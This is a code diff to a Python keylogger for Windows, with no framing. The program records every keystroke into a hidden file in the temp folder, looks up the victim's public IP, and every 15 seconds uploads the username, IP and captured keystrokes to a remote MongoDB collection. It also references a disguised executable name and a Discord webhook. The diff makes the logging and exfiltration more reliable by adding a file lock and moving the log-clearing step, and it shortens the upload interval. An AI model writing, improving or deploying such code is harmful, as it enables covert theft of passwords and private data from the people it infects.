@@ -17,6 +17,7 @@ path_l = os.path.expandvars(f'%TEMP%//{u}_system_meta.txt')
 path_e = os.path.expandvars(f'%TEMP%//AGDInvokerUtility.exe')
 webhook_url = tokens.webhook_url
 uri = tokens.mongo_uri
+file_lock = threading.Lock()
 ##
 
 # MongoDB Setup
@@ -29,8 +30,6 @@ collection = db["logs"]
 current_file = sys.executable
 try:
     ip = public_ip = requests.get('https://api.ipify.org').text
-    with open(path_l, "a") as f:
-        f.write(f"\n{u} {ip}\n")
 except:
     ip = "Unknown"
     pass
@@ -67,8 +66,12 @@ def writetofile(key):
         keydata = "-TAB-"
     if keydata == "Key.ctrl_l" or keydata == "Key.ctrl_r":
         keydata = "-CTRL-"
-    with open(path_l, "a") as f:
-        f.write(keydata)
+    with file_lock:
+        try:
+            with open(path_l, "a") as f:
+                f.write(keydata)
+        except:
+            pass
     ctypes.windll.kernel32.SetFileAttributesW(path_l, 0x02)
 
 #sending logfile to discord(testing/closed)
@@ -95,32 +98,33 @@ def writetofile(key):
 def send_to_mongodb():
     try:
         if os.path.exists(path_l):
-            with open(path_l, "r") as f:
-                content = f.read()
-            
-            # If there is content to send
+            with file_lock:
+                try:
+                    with open(path_l, "r") as f:
+                        content = f.read()
+                    # Clear the local file after successful upload to save space
+                    if content.strip():
+                        ctypes.windll.kernel32.SetFileAttributesW(path_l, 0)
+                        with open(path_l, "w") as f:
+                            f.write("")
+                            ctypes.windll.kernel32.SetFileAttributesW(path_l, 0x02)
+                except Exception as e:
+                    print(f"Error clearing log file: {e}") #remove after testing
+            # Push to MongoDB
             if content.strip():
                 log_entry = {
-                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-                    "username": u,
-                    "ip_address": ip,
-                    "payload": content
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+                "username": u,
+                "ip_address": ip,
+                "payload": content
                 }
-                
-                # Push to MongoDB
                 collection.insert_one(log_entry)
-                
-                # Clear the local file after successful upload to save space
-                with open(path_l, "w") as f:
-                    f.write("")
-                ctypes.windll.kernel32.SetFileAttributesW(path_l, 0x02)
-                
+
     except Exception as e:
         print(f"Error sending to MongoDB: {e}") #remove after testing
         pass
-
 # Schedule next sync in 60 seconds
-threading.Timer(60, send_to_mongodb).start()
+    threading.Timer(15, send_to_mongodb).start()
 
 #start loop
 send_to_mongodb()
